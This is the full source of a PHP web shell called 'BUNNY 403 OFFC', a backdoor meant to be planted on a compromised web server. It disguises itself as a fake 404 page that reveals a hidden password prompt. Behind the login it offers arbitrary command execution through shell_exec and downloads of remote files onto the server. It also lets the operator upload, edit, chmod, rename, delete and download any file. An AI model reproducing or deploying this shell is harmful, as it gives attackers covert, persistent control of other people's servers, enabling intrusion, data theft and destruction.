<?php
/**
 * BUNNY 403 OFFC - Advanced Web Shell
 * Author: BY403
 * Version: 1.1 (Stealth Mode)
 */

error_reporting(0);
session_start();

// Password Protection - Stealth Mode (Error 404 + Click to Show Password Input)
$PASSWORD = "bunny1337";
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== $PASSWORD) {
    if ($_POST['pass'] === $PASSWORD) {
        $_SESSION['auth'] = $PASSWORD;
    } else {
        // Tampilkan error 404 palsu — tapi bisa diklik untuk login
        if (!isset($_POST['pass'])) {
            echo '<html><head><title>404 Not Found</title><style>
                body { background: #fff; color: #000; font-family: Arial, sans-serif; padding: 20px; cursor: pointer; }
                h1 { font-size: 28px; margin-top: 0; }
                p { margin: 10px 0; line-height: 1.5; }
                .password-input { display: none; margin-top: 20px; text-align: center; }
                .password-input input[type="password"] { width: 300px; padding: 8px; border: 1px solid #ccc; }
                .password-input input[type="submit"] { width: 300px; padding: 8px; background: #ffffff; color: white; border: none; cursor: pointer; }
                </style></head><body>
                <h1>Error 404 - Not Found</h1>
                <p>The document you are looking for may have been removed or re-named. Please contact the web site owner for further assistance.</p>
                <div class="password-input" id="passwordInput">
                    <form method="post">
                        <input type="password" name="pass" placeholder="Enter password..." required>
                        <input type="submit" value="Login">
                    </form>
                </div>
                <script>
                    document.body.addEventListener("click", function() {
                        document.getElementById("passwordInput").style.display = "block";
                        document.body.style.cursor = "default";
                    });
                </script>
                </body></html>';
            exit;
        } else {
            // Kalau password salah → tampilkan error 403
            header("HTTP/1.0 403 Forbidden");
            echo '<html><head><title>403 Forbidden</title><style>body{font-family:Arial,sans-serif;background:#f8f8f8;color:#333;padding:20px;}h1{color:#d9534f;}</style></head><body><h1>🚫 403 Forbidden</h1><p>Access to this resource is denied.</p><button onclick="location.reload()">Try Again</button></body></html>';
            exit;
        }
    }
}

// Current Directory
$cwd = isset($_GET['dir']) ? urldecode($_GET['dir']) : getcwd();
@chdir($cwd);

// Execute Command
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . ' 2>&1');
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
}

// Remote Upload
if (isset($_POST['remote_url']) && !empty($_POST['remote_url'])) {
    $url = $_POST['remote_url'];
    $filename = basename($url);
    $content = file_get_contents($url);
    if ($content !== false) {
        file_put_contents($filename, $content);
        echo "✅ File '$filename' uploaded successfully.";
    } else {
        echo "❌ Failed to download from URL.";
    }
}

// Create File/Directory
if (isset($_POST['create_file']) && !empty($_POST['create_file'])) {
    $filename = $_POST['create_file'];
    file_put_contents($filename, "");
    echo "✅ File '$filename' created.";
}
if (isset($_POST['create_dir']) && !empty($_POST['create_dir'])) {
    $dirname = $_POST['create_dir'];
    mkdir($dirname, 0755, true);
    echo "✅ Directory '$dirname' created.";
}

// Upload File
if (isset($_FILES['upload_file']['name']) && $_FILES['upload_file']['error'] == 0) {
    $upload_path = $_FILES['upload_file']['name'];
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $upload_path)) {
        echo "✅ File '$upload_path' uploaded.";
    } else {
        echo "❌ Upload failed.";
    }
}

// Search Files
$search_results = [];
if (isset($_POST['search_query']) && !empty($_POST['search_query'])) {
    $query = $_POST['search_query'];
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.'));
    foreach ($iterator as $file) {
        if (strpos($file->getFilename(), $query) !== false) {
            $search_results[] = $file->getPathname();
        }
    }
}

// File Operations
if (isset($_GET['action'])) {
    $action = $_GET['action'];
    $file = $_GET['file'];
    switch ($action) {
        case 'edit':
            if (isset($_POST['content'])) {
                file_put_contents($file, $_POST['content']);
                echo "✅ File saved.";
            }
            echo '<form method="post"><textarea name="content" rows="20" cols="80">' . htmlspecialchars(file_get_contents($file)) . '</textarea><br><input type="submit" value="Save"></form>';
            break;
        case 'chmod':
            $mode = $_GET['mode'];
            chmod($file, octdec($mode));
            echo "✅ Permission changed to $mode.";
            break;
        case 'rename':
            if (isset($_POST['newname'])) {
                $newname = $_POST['newname'];
                rename($file, $newname);
                echo "✅ Renamed to " . htmlspecialchars($newname) . ".";
            } else {
                echo '<form method="post">
                    New name: <input type="text" name="newname" value="' . htmlspecialchars(basename($file)) . '" required>
                    <input type="submit" value="Rename">
                </form>';
            }
            break;
        case 'delete':
            if (is_dir($file)) {
                rmdir($file);
            } else {
                unlink($file);
            }
            echo "✅ Deleted.";
            break;
        case 'download':
            if (file_exists($file)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                readfile($file);
                exit;
            }
            break;
    }
}

?>

<!DOCTYPE html>
<html>
<head>
    <title>BUNNY 403 OFFC</title>
    <style>
        body { background: #1e1e1e; color: #fff; font-family: monospace; padding: 20px; }
        input, button { margin: 5px; padding: 5px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #444; padding: 5px; text-align: left; }
        a { color: #4da6ff; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <h2>🐰 BUNNY 403 OFFC — Advanced Web Shell</h2>

    <!-- Execute Command -->
    <form method="post">
        <input type="text" name="cmd" placeholder="Enter command" style="width: 60%;">
        <input type="submit" value="Execute">
    </form>

    <!-- Remote Upload -->
    <form method="post">
        <input type="text" name="remote_url" placeholder="Remote File URL" style="width: 60%;">
        <input type="submit" value="Remote Upload">
    </form>

    <!-- Search -->
    <form method="post">
        <input type="text" name="search_query" placeholder="Search files or folders" style="width: 60%;">
        <input type="submit" value="Search">
    </form>

    <!-- Create File/Directory -->
    <form method="post">
        <input type="text" name="create_file" placeholder="Enter file name" style="width: 30%;">
        <input type="submit" value="Create File">
        <input type="text" name="create_dir" placeholder="Enter directory name" style="width: 30%;">
        <input type="submit" value="Create Directory">
    </form>

    <!-- Upload File -->
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="upload_file">
        <input type="submit" value="Upload">
    </form>

    <!-- Current Directory with Navigation -->
    <p>
        <strong>CWD:</strong> 
        <?php
        $parts = explode('/', trim($cwd, '/'));
        $path = '';
        foreach ($parts as $part) {
            if (!empty($part)) {
                $path .= '/' . $part;
                echo "<a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($part) . "</a>/";
            }
        }
        ?>
        <a href="?dir=<?= urlencode(dirname($cwd)) ?>" style="margin-left:10px; color:#ff6666;">[..]</a>
    </p>

    <!-- File List -->
    <table>
        <tr>
            <th>Type</th>
            <th>Name</th>
            <th>Size</th>
            <th>Actions</th>
        </tr>
        <?php
        $files = @scandir('.');
        if ($files === false) {
            echo "<tr><td colspan='4'>❌ Cannot read directory.</td></tr>";
        } else {
            foreach ($files as $file) {
                if ($file === '.' || $file === '..') continue;
                $path = realpath($file);
                if ($path === false) continue;
                $is_dir = is_dir($path);
                $size = $is_dir ? '-' : filesize($path);
                echo "<tr>";
                echo "<td>" . ($is_dir ? 'Directory' : 'File') . "</td>";
                echo "<td>";
                if ($is_dir) {
                    echo "<a href='?dir=" . urlencode($path) . "'>" . htmlspecialchars($file) . "</a>";
                } else {
                    echo htmlspecialchars($file);
                }
                echo "</td>";
                echo "<td>" . $size . "</td>";
                echo "<td>";
                if (!$is_dir) {
                    echo "<a href='?action=edit&file=" . urlencode($file) . "'>Edit</a> | ";
                    echo "<a href='?action=chmod&file=" . urlencode($file) . "&mode=755'>Chmod</a> | ";
                    echo "<a href='?action=rename&file=" . urlencode($file) . "'>Rename</a> | ";
                    echo "<a href='?action=delete&file=" . urlencode($file) . "' onclick='return confirm(\"Delete?\")'>Delete</a> | ";
                    echo "<a href='?action=download&file=" . urlencode($file) . "'>Download</a>";
                } else {
                    echo "<a href='?dir=" . urlencode($path) . "'>Open</a> | ";
                    echo "<a href='?action=chmod&file=" . urlencode($file) . "&mode=755'>Chmod</a> | ";
                    echo "<a href='?action=rename&file=" . urlencode($file) . "'>Rename</a> | ";
                    echo "<a href='?action=delete&file=" . urlencode($file) . "' onclick='return confirm(\"Delete?\")'>Delete</a>";
                }
                echo "</td>";
                echo "</tr>";
            }
        }
        ?>
    </table>

    <!-- Search Results -->
    <?php if (!empty($search_results)): ?>
    <h3>🔍 Search Results:</h3>
    <ul>
        <?php foreach ($search_results as $result): ?>
        <li><?= htmlspecialchars($result) ?></li>
        <?php endforeach; ?>
    </ul>
    <?php endif; ?>

    <!-- Logout -->
    <p><a href="?logout=1">Logout</a></p>

    <?php
    if (isset($_GET['logout'])) {
        session_destroy();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    ?>
</body>
</html>